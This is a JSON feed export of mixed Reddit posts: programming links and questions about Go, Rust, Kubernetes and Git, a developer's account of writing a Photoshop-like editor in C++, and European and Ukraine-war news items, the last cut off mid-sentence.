{"id":"i2nisf4o","title":"Reddit","displayTitle":"Reddit","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":86,"items":[{"title":"Finding the Right Collaborator on GitHub","url":"https://medium.com/@miltonhyndrex/finding-the-right-collaborator-on-github-d174d021e202","date":1742156116,"author":"/u/Zestyclose-Poet9876","guid":761,"unread":true,"content":"<p>In the fast-paced world of software development, collaboration is key to bringing innovative ideas to life. Whether you’re an open-source enthusiast or working on a private project, finding the right collaborator can make a significant difference. In this blog post, we’ll explore strategies for finding the perfect collaborator on GitHub and introduce you to a handy tool l designed to streamline this process.</p><p>Collaboration offers numerous benefits:</p><ul><li>: Teaming up with others brings a variety of skills to the table.</li><li>: Sharing the workload helps in achieving milestones faster.</li><li>: Collaborating with others allows you to learn new techniques and best practices.</li><li>: Different perspectives can lead to more effective solutions.</li></ul><p>GitHub’s search functionality is a powerful tool for finding potential collaborators. You can search for users based on their repositories, contributions, and skills.</p><ul><li>: Find users who have worked on projects similar to yours.</li><li>: Look for users proficient in the programming languages your project requires.</li><li>: Use topic tags to discover repositories and contributors with specific interests.</li></ul><p>Be an active member of the GitHub community:</p><ul><li><strong>Participate in Discussions</strong>: Join conversations in issues and pull requests.</li><li><strong>Contribute to Open Source</strong>: Contributing to other projects can help you connect with like-minded developers.</li><li><strong>Attend Meetups and Events</strong>: GitHub hosts various events where you can meet potential collaborators.</li></ul><p>Platforms like Twitter, Reddit, and specialized forums can be great places to find collaborators. Share your project details and what you’re looking for in a collaborator.</p><p>Don’t underestimate the power of your existing network. Let your colleagues and friends know you’re looking for collaborators. They might know someone who fits the bill.</p><p>To simplify the process of finding the right collaborator, we developed the . This application leverages the GitHub API to help you find potential collaborators based on specific criteria.</p><ul><li>: Quickly find users by their GitHub username.</li><li>: Discover users based on their repositories, skills, or interests.</li><li>: Identify users who have contributed to specific repositories.</li><li>: Narrow down search results based on geographical location.</li><li>: View detailed profiles including repositories, contributions, and activity.</li></ul><p>Check it out on: <a href=\"https://collaborator-finder-tool.onrender.com/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://collaborator-finder-tool.onrender.com/</a></p><p>By using this tool, you can easily find collaborators who match your project’s needs and get detailed information about their GitHub activity. If you want in on the action you can find this project on GitHub.</p><p>Find Repo here: <a href=\"https://github.com/nia-cloud-official/collaborator-finder-tool/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://github.com/nia-cloud-official/collaborator-finder-tool/</a></p><p>Finding the right collaborator on GitHub can significantly enhance your project’s development process. By leveraging GitHub’s search features, engaging with the community, and utilizing tools like the Collaborator Finder Tool, you can connect with talented developers who share your vision.</p>","contentLength":2928,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jculpk/finding_the_right_collaborator_on_github/"},{"title":"LZAV 4.9: Increased decompression speed, resolved all msan issues, better platform detection. Fast In-Memory Data Compression Algorithm (inline C/C++) 460+MB/s compress, 2800+MB/s decompress, ratio% better than LZ4, Snappy, and Zstd@-1","url":"https://github.com/avaneev/lzav","date":1742154395,"author":"/u/avaneev","guid":762,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jctxqb/lzav_49_increased_decompression_speed_resolved/"},{"title":"Brick Lane, London","url":"https://www.reddit.com/r/europe/comments/1jcszfz/brick_lane_london/","date":1742151954,"author":"/u/novitasdigital","guid":768,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The Ultimate Git Tutorial (Git 2.48)","url":"https://www.reddit.com/r/programming/comments/1jcslub/the_ultimate_git_tutorial_git_248/","date":1742151011,"author":"/u/jhcarl0814","guid":735,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Discovering the secrets of linux kernel","url":"https://github.com/Gliese832B/gdp","date":1742150091,"author":"/u/BisonUseful257","guid":734,"unread":true,"content":"<p>GDP is an attempt to create a simple network library via XDP.</p><p>XDP is a kernel-level packet processor that provides super fast features.</p><p>My method: I try to manipulate xdp by sending packet my own interface and then xdp will capture that. And I can receive packets in kernel level but I still did not add that to code.</p><p>Why did not i use AF_XDP?</p><p>eh I actually don't know. Even I am not sure about that I can use that. I just want to create my own method I do not care it is good or not. I would even be happy if someone learned about XDP because of me.</p><p>I will take care any suggestion.</p>","contentLength":578,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcs8kc/discovering_the_secrets_of_linux_kernel/"},{"title":"Simulating a quantum computer in 200 lines of code","url":"https://gist.github.com/vtereshkov/b2e404cd94dc431c0b3b027c622361c7","date":1742150071,"author":"/u/vtereshkov","guid":748,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcs89r/simulating_a_quantum_computer_in_200_lines_of_code/"},{"title":"French politician says US should give back Statue of Liberty","url":"https://www.lemonde.fr/en/politics/article/2025/03/16/french-mep-says-us-should-give-back-statue-of-liberty_6739217_5.html","date":1742149181,"author":"/u/pierrepaul","guid":736,"unread":true,"content":"<p>France should take back the Statue of Liberty because the US no longer represents the values that led France to offer the statue, a French member of the European Parliament said Sunday, March 16. \"Give us back the Statue of Liberty,\" centre-left politician Raphaël Glucksmann said at a convention of his Place Publique center-left movement.</p><p>\"We're going to say to the Americans who have chosen to side with the tyrants, to the Americans who fired researchers for demanding scientific freedom: 'Give us back the Statue of Liberty,'\" he told cheering supporters. \"We gave it to you as a gift, but apparently you despise it. So it will be just fine here at home,\" he added.</p><p>The Statue of Liberty was unveiled in New York City's harbour on October 28, 1886, for the centennial of the American Declaration of Independence as a gift from the French people to America. It was designed by Frenchman Auguste Bartholdi. Paris does have a far smaller copy of the statue on a small island on the Seine in Paris.</p><p>Glucksmann, a staunch defender of Ukraine, has strongly criticized President Donald Trump's radical change of US policy on the war. He also took aim at Trump's cuts to US research institutions, which have already prompted a French government initiative to attract some of them to work in France.</p><p>\"The second thing we're going to say to the Americans is: 'If you want to fire your best researchers, if you want to fire all the people who, through their freedom and their sense of innovation, their taste for doubt and research, have made your country the world's leading power, then we're going to welcome them,'\" continued Glucksmann.</p><p>Since Trump returned to the White House in January, his government has cut federal research funding and sought to dismiss hundreds of federal workers working on health and climate research.</p><p>Glucksmann also criticized far-right leaders in France, accusing them of being a \"fan club\" for Trump and billionaire Elon Musk, who is spearheading the president's efforts to cut spending.</p>","contentLength":2009,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jcrvwd/french_politician_says_us_should_give_back_statue/"},{"title":"Complete idiot looking to transition to Rust from .NET and the Microsoft tech stack","url":"https://www.reddit.com/r/rust/comments/1jcqzml/complete_idiot_looking_to_transition_to_rust_from/","date":1742146851,"author":"/u/Big-Boy-Turnip","guid":755,"unread":true,"content":"<p>I've committed to starting new projects in Rust and, over time, rewriting existing code as well. So far, I'm getting somewhat comfortable with porting C console apps to Rust and using Rust in Web apps wherever it makes sense.</p><p>That said, my bread and butter (as a self-employed software developer) is and always has been .NET and the Microsoft tech stack starting with C#. I make desktop apps and even in 2025 still target Windows 7 (for some projects).</p><p>My clients are sometimes small government agencies, sometimes hobbyists looking to revive old equipment, and everything and everyone in between. I've written code for Windows drivers and I have a strong sense for that.</p><p>I believe that Rust enables me to write better code. I'm getting to grips with new terminology and the greater Rust ecosystem, from packages and crates to handling parallelism. What I'm missing are more examples and resources.</p><p>Where would I start transitioning my .NET desktop app development towards a Rust base? I don't need the code to produce native GUI elements, but I've yet to find a proper UI library for Windows that's built on Rust. Is this something I should pursue?</p><p>Furthermore, it looks like there are very few Rust developers who are also mainly Windows developers, so I get the feeling I'm in a minority inside of a minority and that's OK. I'd just like to hear about others' experiences working in this space!</p><p>Does Rust make sense, in your opinion, for what I'm seeking or should I give up and keep writing in C#, C/C++, and .NET? Thank you!</p>","contentLength":1523,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"One giant Kubernetes cluster for everything","url":"https://blog.frankel.ch/one-giant-kubernetes-cluster/","date":1742146623,"author":"/u/nfrankel","guid":764,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1jcqwhg/one_giant_kubernetes_cluster_for_everything/"},{"title":"LACT v0.7.2 released with RDNA4 support, Nvidia locked clocks and ROP count reporting","url":"https://github.com/ilya-zlobintsev/LACT/releases/tag/v0.7.2","date":1742145736,"author":"/u/Interject_","guid":766,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jcqk0s/lact_v072_released_with_rdna4_support_nvidia/"},{"title":"Dev Recreates Photoshop in C++","url":"https://f055.net/technology/that-time-i/that-time-i-recreated-photoshop-in-c/","date":1742144735,"author":"/u/HimothyJohnDoe","guid":725,"unread":true,"content":"<div><div><p>As I’m getting older I look back on all the things I’ve done as a creative developer, and I see so many cool projects! But I never wrote down any development stories, and most of these projects, even as successful when released, got lost in time as years go by. That’s why I’m starting my new posts series „That time I” where I look back on my most interesting projects.</p></div></div><p>The first one is about that time I recreated Photoshop in C++ and Windows API! I invite you to read my story and leave a comment with feedback, it’s hard to go on without your input 🙂</p><p>Everything started in early summer of 2006. I was reading *a lot* of manga back then. But all the image reading apps sucked. Specifically, none of the apps allowed me to control my reading using just the mouse, and reaching my keyboard all the time was distracting. Since I just finished the C++/Windows API course at the uni, I spent the summer break coding my perfect manga reader. And I named it <a href=\"https://github.com/f055/fiew-image-viewer\" target=\"_blank\" rel=\"noopener\">Fiew</a>.</p><p>Early autumn 2006 we returned to uni and had to decide on our final thesis for the degree. Writing the image viewer went smooth enough that I got the idea I could create an image editor as well. I was a heavy Adobe Photoshop user back then, so that became my goal. I mean, how hard can it be? Turns out, very.</p><p>Over the course of the next several months, I wrote Advanced Image Editor named Fedit in C++ using Windows API and GDI+ graphic libraries. It followed a set of five rules to benefit the end user: no installers, no archives, no registry keys, no additional runtimes and a single executable file. The result was a program that was ready to work without the need of installation, could be run on systems with limited privileges (or straight from a thumb drive) and consumed small amounts of resources.</p><p>I was very careful to make the interface look like classic Photoshop, and include all my most used features. So you had all the free floating windows with tools. The excellent colour picker. Easy layer management. Step-by-step reversible history. Several image filters, plus a matrix interface to encode your own pixel shifting filters too.</p><p>Straight from my previous project named Fiew I added a massive image library viewer. It really could quickly and easily scroll through massive amounts of pictures.</p><p>I had a lot of fun coding Fedit. And a lot of issues along the way. I spent a ton of time on MSDN and Stack Overflow, however that didn’t help that much since most of the issues were so specific I had to analyse and debug them on my own. But I worked like crazy on it, my motivation was immense. I had to make the bachelor thesis deadline, so for the final two-month stint I worked 14 hours a day.</p><p>User interface was the most tricky bit. I wanted the workflow to resemble Photoshop as much as possible. The freely snapping-unsnapping of the tool settings pane was particularly hard. But no less than recreating the colour picker or the tool selector.</p><p>By the time I finished I was pretty exhausted and kind of resenting WinAPI. But the thesis was a success and I received my Bachelor of Science in Engineering from the Warsaw University of Technology. Fedit received several positive reviews online but I didn’t promote it. Instead I took a well deserved holiday. A few months later thanks to the impression Fiew and Fedit made on the CTO of GoldenLine (Polish LinkedIn, market leader in its time, but now defunct), I landed a C++ job with a task to create extremely efficient WinAPI app to handle massive image uploading for a clone of Flickr. So in the end all that effort paid off.</p><p>Fedit (and Fiew) source code is available on <a href=\"https://github.com/f055/fedit-image-editor\" target=\"_blank\" rel=\"noopener\">GitHub</a>. The thesis documentation is available as <a href=\"https://f055.net/wp-content/uploads/files/Thesis-Fedit.pdf\">PDF</a>. The original website for these apps is still up on the <a href=\"https://web.archive.org/web/20140517125711/http://fapplication.org/\" target=\"_blank\" rel=\"noopener\">Web Archive</a>!</p>","contentLength":3735,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcq61a/dev_recreates_photoshop_in_c/"},{"title":"tk9.0: v0.65.0 adds support for many more image formats","url":"https://www.reddit.com/r/golang/comments/1jcpp3d/tk90_v0650_adds_support_for_many_more_image/","date":1742143528,"author":"/u/0xjnml","guid":723,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/0xjnml\"> /u/0xjnml </a>","contentLength":29,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"MCP-server written in GO","url":"https://www.reddit.com/r/golang/comments/1jcp06c/mcpserver_written_in_go/","date":1742141699,"author":"/u/Temporary-Funny-1630","guid":760,"unread":true,"content":"<p>Hey everyone! I’d love to share my project with you:</p><p>🚀  – a powerful  for AI agents!</p><p>-  for AI agent interactions - <strong>Supports multiple databases</strong>: PostgreSQL, MySQL, ClickHouse, Oracle, and more - <strong>Flexible modular architecture</strong> with plugins:</p><ul></ul><p>⭐ <strong>Give it a star and come contribute!</strong> 🔗 Repo: <a href=\"https://github.com/centralmind/gateway\">GitHub</a></p>","contentLength":300,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go is DOOMed","url":"https://gitlab.com/cznic/doomgeneric/-/raw/master/sshot.png","date":1742139955,"author":"/u/0xjnml","guid":569,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jcochm/go_is_doomed/"},{"title":"London","url":"https://www.reddit.com/r/europe/comments/1jco47i/london/","date":1742139338,"author":"/u/wrapityup","guid":731,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How the hell do I make this Go program faster?","url":"https://www.reddit.com/r/golang/comments/1jcnqfi/how_the_hell_do_i_make_this_go_program_faster/","date":1742138311,"author":"/u/yourpwnguy","guid":568,"unread":true,"content":"<p>So, I’ve been messing around with a Go program that: </p><ul><li>Writes the sorted output to a new file</li></ul><p>Seems so straightforward man :( Except it’s slow as hell. Here’s my code: </p><p>import ( \"fmt\" \"os\" \"strings\" \"slices\" )</p><p>func main() { if len(os.Args) &lt; 2 { fmt.Fprintln(os.Stderr, \"Usage:\", os.Args[0], \"&lt;file.txt&gt;\") return }</p><pre><code>// Read the input file f, err := os.ReadFile(os.Args[1]) if err != nil { fmt.Fprintln(os.Stderr, \"Error reading file:\", err) return } // Process the file lines := strings.Split(string(f), \"\\n\") uniqueMap := make(map[string]bool, len(lines)) </code></pre><p>var trimmed string for _, line := range lines { if trimmed = strings.TrimSpace(line); trimmed != \"\" { uniqueMap[trimmed] = true } }</p><pre><code>// Convert map keys to slice ss := make([]string, len(uniqueMap)) i := 0 for key := range uniqueMap { ss[i] = key i++ } slices.Sort(ss) // Write to output file o, err := os.Create(\"out.txt\") if err != nil { fmt.Fprintln(os.Stderr, \"Error creating file:\", err) return } defer o.Close() o.WriteString(strings.Join(ss, \"\\n\") + \"\\n\") </code></pre><p>I ran this on a big file, here's the link:</p><p>It takes  to run. That’s unacceptable. My CPU (R5 4600H 6C/12T, 24GB RAM) should not be struggling this hard.</p><p>I also profiled this code, Profiling Says: 1. Sorting (slices.Sort) is eating CPU. 2. GC is doing a world tour on my RAM. 3. map[string]bool is decent but might not be the best for this. I also tried the map[string] struct{} way but it's makes really minor difference.</p><p>The Goal: I want this thing to finish in 2-3 seconds. Maybe I’m dreaming, but whatever.</p><p>Any insights, alternative approaches, or even just small optimizations would be really helpful. Please if possible give the code too. Because I've literally tried so many variations but it still doesn't work like I want it to be. I also want to get better at writing efficient code, and squeeze out performance where possible.</p>","contentLength":1853,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Capital is flowing from the U.S. to Europe","url":"https://www.reddit.com/r/europe/comments/1jcnpwl/capital_is_flowing_from_the_us_to_europe/","date":1742138268,"author":"/u/PjeterPannos","guid":739,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Unity protects us","url":"https://www.reddit.com/r/europe/comments/1jcn126/unity_protects_us/","date":1742136346,"author":"/u/PjeterPannos","guid":721,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"GitOps Principles - Separate Repositories for App & Kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1jcn002/gitops_principles_separate_repositories_for_app/","date":1742136264,"author":"/u/k8s_maestro","guid":369,"unread":true,"content":"<p>For a production-grade environment, the best practice is to keep the application source code and infra in separate Git repositories. </p><p>Is it true GirOps Principle? As it ensures clear separation of concerns, security and operational stability.</p>","contentLength":241,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"xlskubectl — a spreadsheet to control your Kubernetes cluster","url":"https://github.com/learnk8s/xlskubectl","date":1742136231,"author":"/u/ponton","guid":368,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1jcmzkc/xlskubectl_a_spreadsheet_to_control_your/"},{"title":"OpenSource Book: Embedded programming with ESP32 (For esp-hal 1.0.0-beta)","url":"https://www.reddit.com/r/rust/comments/1jcmj3g/opensource_book_embedded_programming_with_esp32/","date":1742134952,"author":"/u/AstraKernel","guid":722,"unread":true,"content":"<div><p>The book \"impl Rust for ESP32\" has been migrated to use the latest esp-hal 1.0.0-beta; The book uses development board \"ESP32 DevKit V1 and follows practical exercises approach. Added more chapters also.</p><ul><li>Blink LED, Fading LED with PWM</li><li>Displaying Text and Ferris image on OLED display</li><li>Buzzer to make beep sound and play Pink Panther song (repo for other songs)</li><li>Using Ultrasonic to measure object distance</li><li>Control Servo motor with LEDC as well as MCPWM peripherals</li><li>Turning on LED when room gets darker with LDR</li><li>Connect to existing Wi-Fi or Create own Wi-Fi</li><li>Run web server to turn on LED on ESP32</li><li>Create Burglar alarm simulation with PIR Sensor</li><li>Displaying temperature on OLED</li><li>Reading and Writing SD Card</li><li>Working with RFID and Door Access Control simulation</li><li>Send and Receive from mobile to ESP32 via Bluetooth</li></ul></div>   submitted by   <a href=\"https://www.reddit.com/user/AstraKernel\"> /u/AstraKernel </a>","contentLength":826,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes","url":"https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/","date":1742134690,"author":"/u/FlairPrime","guid":361,"unread":true,"content":"<p>Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!</p><p>This package acts like a : It is  and , providing everything you need in just  file with <strong>less than 200 lines of code</strong>.</p><ul><li>You want to  define your HTTP routes while using  the standard library.</li><li>You want to define  for your routes, groups, and subgroups while still relying on the standard library.</li><li>You  want to use  bloated with excessive functionalities that you might never use.</li></ul>","contentLength":501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Macron to EU colleagues: Stop buying American, buy European","url":"https://www.politico.eu/article/macron-to-eu-colleagues-stop-buying-american-buy-european/","date":1742132480,"author":"/u/Deedogg11","guid":741,"unread":true,"content":"<div><p>The two also agreed “to continue working towards restoring communication between the United States and Russia,” Washington says.</p></div>","contentLength":132,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/europe/comments/1jcloq7/macron_to_eu_colleagues_stop_buying_american_buy/"},{"title":"Macron to EU colleagues: Stop buying American, buy European","url":"https://www.politico.eu/article/macron-to-eu-colleagues-stop-buying-american-buy-european/","date":1742132263,"author":"/u/Deedogg11","guid":570,"unread":true,"content":"<div><p>The two also agreed “to continue working towards restoring communication between the United States and Russia,” Washington says.</p></div>","contentLength":132,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jclm8c/macron_to_eu_colleagues_stop_buying_american_buy/"},{"title":"50% of Moscow’s fuel supply at risk after Ukrainian drone strike on its largest oil refinery","url":"https://euromaidanpress.com/2025/03/16/frontline-report-50-of-moscows-fuel-supply-at-risk-after-ukrainian-drone-strike-on-its-largest-oil-refinery/","date":1742131916,"author":"/u/eaglemaxie","guid":390,"unread":true,"content":"<p data-start=\"51\" data-end=\"127\">Today, there are a lot of interesting updates from the Russian Federation.</p><p data-start=\"129\" data-end=\"470\">Ukrainian drones penetrated deep into Russian territory, and explosions lit up the skies over Moscow and several key cities. While strikes on oil refineries and military targets were significant, one attack stood out—the hit on the Druzhba pipeline—creating international ripple effects beyond Russia’s borders as exports suddenly dropped.</p><p data-start=\"472\" data-end=\"900\">As you remember from a previous report, Ukrainians destroyed a significant number of Russian air defenses in Crimea, along the front line, and deep in the rear while also threatening to strike the Kerch Strait Bridge again. This forced Russia to relocate air defense systems to cover newly exposed weak spots. However, this played into Ukraine’s strategy, as the large-scale redeployments left several key targets vulnerable.</p><p data-start=\"902\" data-end=\"1259\">This allowed Ukrainians to deploy hundreds of drones to penetrate Russia’s air defense grid, which was spread thin by the countless destroyed systems and subsequent relocations. As a result, Ukrainian drones reached as far as Moscow, with the first confirmed strike hitting the Oka-Center oil depot in the town of Serpukhov in Moscow Oblast, inflicting significant damage during the day.</p><p data-start=\"1261\" data-end=\"1623\">What followed was Russia’s most restless night yet. Russian reports state that over 337 Ukrainian drones struck Moscow, Kursk, Belgorod, Oryol, Lipetsk, Bryansk, and Ryazan in the largest drone strike to date. Strikes hit oil refineries in the Moscow area, including the city’s largest refinery, which supplies up to 50% of its diesel and gasoline consumption.</p><h3 data-start=\"1080\" data-end=\"1160\"><strong data-start=\"1084\" data-end=\"1158\">Ukraine targets Russian oil: Druzhba pipeline and refineries disrupted</strong></h3><p data-start=\"1625\" data-end=\"1925\">Explosions near the Ryazan military airfield put all Russian airports on high alert, undermining the Russian Air Force’s rapid response capabilities. Additionally, a control station for the Druzhba pipeline in Oryol was hit, halting Russian oil exports to Central Europe, particularly Hungary.</p><p data-start=\"1927\" data-end=\"2398\">The Druzhba pipeline—one of the world’s largest, with a capacity of 2 million barrels per day—is a critical conduit for Russian oil exports to Central European refineries. Hungary imports most of its crude oil and gas via the Druzhba pipeline, with over 40% of Hungarian gas being Russian, making the strike on the control station particularly devastating for them. As a result, the Hungarian Foreign Minister, Péter Szijjártó, called it an attack on their sovereignty.</p><p data-start=\"2400\" data-end=\"2807\">When the oil and gas supply stopped, the halt of operations of the Druzhba pipeline meant that Hungary would have to import much more expensive oil and gas from allies like the USA and Norway. The cancellation of Russian oil and gas exports to Hungary could jeopardize Russia’s hold on the Hungarian energy sector, as the country would have to increase its overall reliance on Europe for its energy needs.</p><p data-start=\"2809\" data-end=\"3456\">Besides gas, the second-largest Hungarian energy source is nuclear power from its only nuclear power plant in Paks. This nuclear power plant depends on Russia’s nuclear fuel, uranium rods, and Russian engineers and expertise, consolidating Russia’s monopoly on the Hungarian energy sector. Through this, Russia maintains strict control over Hungary, as only Russian specialists and companies can currently maintain the reactors and supply critical equipment and fuel for their maintenance. Since nuclear power generates over a third of the country’s electricity, Hungary remains reliant on Russia to sustain its energy infrastructure.</p><p data-start=\"3458\" data-end=\"3686\">The Hungarian Foreign Minister stated that he had discussed the situation with the Deputy Russian Energy Minister, who assured him that pipeline control station repairs were underway and supplies would resume soon.</p><h3 data-start=\"2894\" data-end=\"2957\"><strong data-start=\"2898\" data-end=\"2955\">Ukraine’s strategy: escalation or ceasefire leverage?</strong></h3><p data-start=\"3688\" data-end=\"3919\">If Russia does not accept a ceasefire—at least in the air—Ukraine can exert much more pressure on Russia’s energy hold on Hungary by launching follow-up strikes to destroy critical export infrastructure further and delay repairs.</p><p data-start=\"3921\" data-end=\"4420\">Overall, Ukrainian drone strikes on Russian oil refineries and energy infrastructure are escalating. The latest attack hit Moscow’s main refinery, which supplies half the city’s energy needs. Additionally, damage to the Druzhba pipeline control station temporarily halted Russian energy exports to Hungary. Continued strikes could strain Russia’s economy and weaken its geopolitical influence, potentially pushing it toward negotiating a ceasefire—at least in the airspace over Russia and Ukraine.</p><p data-start=\"3921\" data-end=\"4420\"><a href=\"https://youtu.be/jzX0f8pt-pY?si=IaTnP5im_An4UTGh\" target=\"_blank\" rel=\"noopener\"></a><a href=\"http://savefrom.net/?url=https%3A%2F%2Fyoutu.be%2FjzX0f8pt-pY%3Fsi%3DIaTnP5im_An4UTGh&amp;utm_source=chrome&amp;utm_medium=extensions&amp;utm_campaign=link_modifier\" target=\"_blank\" title=\"Отримай пряме посилання\" rel=\"noopener\"></a><a href=\"http://savefrom.net/?url=https%3A%2F%2Fyoutu.be%2FjzX0f8pt-pY%3Fsi%3DIaTnP5im_An4UTGh&amp;utm_source=chrome&amp;utm_medium=extensions&amp;utm_campaign=link_modifier\" target=\"_blank\" title=\"Отримай пряме посилання\" rel=\"noopener\"></a><em>, we pair up with the military blogger Reporting from Ukraine to keep you informed about what is happening on the battlefield in the Russo-Ukrainian war.</em></p><div><div><strong>You could close this page. Or you could join our community and help us produce more materials like this.&nbsp;</strong>\n\nWe keep our reporting open and accessible to everyone because we believe in the power of free information. This is why our small, cost-effective team depends on the support of readers like you to bring deliver timely news, quality analysis, and on-the-ground reports about Russia's war against Ukraine and Ukraine's struggle to build a democratic society.\n\nA little bit goes a long way: for as little as the cost of one cup of coffee a month, you can help build bridges between Ukraine and the rest of the world, plus become a co-creator and vote for topics we should cover next. <a href=\"https://www.patreon.com/euromaidanpress\" target=\"_blank\"></a>or see other ways to <a href=\"https://www.patreon.com/bePatron?u=36526209\" target=\"_blank\" data-patreon-widget-type=\"become-patron-button\">Become a Patron!</a></div></div>","contentLength":5376,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jcliak/50_of_moscows_fuel_supply_at_risk_after_ukrainian/"},{"title":"Russia has lost 100,000 military personnel in 2025, says Ukraine's commander-in-chief","url":"https://www.pravda.com.ua/eng/news/2025/03/16/7503132/","date":1742131377,"author":"/u/eaglemaxie","guid":751,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jclcbj/russia_has_lost_100000_military_personnel_in_2025/"},{"title":"Building a UI for Kubernetes, Helpful or Useless?","url":"https://www.reddit.com/r/kubernetes/comments/1jckjsm/building_a_ui_for_kubernetes_helpful_or_useless/","date":1742128776,"author":"/u/Pavel-Lukasenko","guid":371,"unread":true,"content":"<p>Hey everyone. I'm have been using Kubernetes for the last two years now and somehow got tired of typing kubectl and other stuff via command line.</p><p>I have built a native app that runs on my MacBook and helps me speed up cluster deployment, app publishing and debugging with the help of the UI.</p><p>I don't know if that might be useful for anyone but I am really open to any feedback.</p><p>Would you like trying it?</p>","contentLength":400,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Guess who claims all the credits","url":"https://www.reddit.com/r/europe/comments/1jckiur/guess_who_claims_all_the_credits/","date":1742128686,"author":"/u/A_Lazko","guid":401,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The solution is a federal Europe! Federalists in Rome","url":"https://www.reddit.com/r/europe/comments/1jck95y/the_solution_is_a_federal_europe_federalists_in/","date":1742127709,"author":"/u/EUstrongerthanUS","guid":740,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"SteamOS 3.7.0 Preview Released (with KDE Plasma 6 & beginnings of support for non-Steam Deck handhelds)","url":"https://steamcommunity.com/games/1675200/announcements/detail/529841158837240757","date":1742127048,"author":"/u/pihug12","guid":382,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jck2mn/steamos_370_preview_released_with_kde_plasma_6/"},{"title":"‘We must stop Putin’: Zelensky says Russians launched 1,020 attack drones, 1,360 guided aerial bombs this week","url":"https://www.livemint.com/news/world/russians-launched-over-1-020-attack-drones-1-360-guided-aerial-bombs-zelensky-says-we-must-stop-putin-together/amp-11742121335892.html","date":1742125563,"author":"/u/sweatycat","guid":730,"unread":true,"content":"<p>“Hundreds of attacks on our cities and communities this week: Chernihiv, Kherson, Donetsk, Kharkiv, Dnipro, Odesa, Poltava, Kyiv, Mykolaiv, Zaporizhzhia, and Sumy regions. The Russians launched over 1,020 attack drones, nearly 1,360 guided aerial bombs, and more than 10 missiles of various types,” said Zelensky in a post on X.</p>","contentLength":332,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jcjolh/we_must_stop_putin_zelensky_says_russians/"},{"title":"Not for Russia to decide on peacekeepers in Ukraine, Macron says","url":"https://www.reuters.com/world/europe/not-russia-decide-peacekeepers-ukraine-macron-says-2025-03-16/","date":1742122992,"author":"/u/sweatycat","guid":385,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jcj23d/not_for_russia_to_decide_on_peacekeepers_in/"},{"title":"Git 2.49 Released With Faster Packing, Rust Foreign Language Interface","url":"https://www.phoronix.com/news/Git-2.49-Released","date":1742121486,"author":"/u/corvus_192","guid":374,"unread":true,"content":"\nGit 2.49 is out today as the latest feature update for this widely-used distributed version control system.\n<p>Git 2.49 delivers faster packing via name-hash v2, a new \"git backfill\" tool to address any missing historical blobs, \"git clone\" learned to make a shallow clone for a single commit that is not necessarily at the tip of any branch, lazy-loading missing files in a blobless clone, zlib-ng support preparations, and a foreign language interface for Rust has been added to 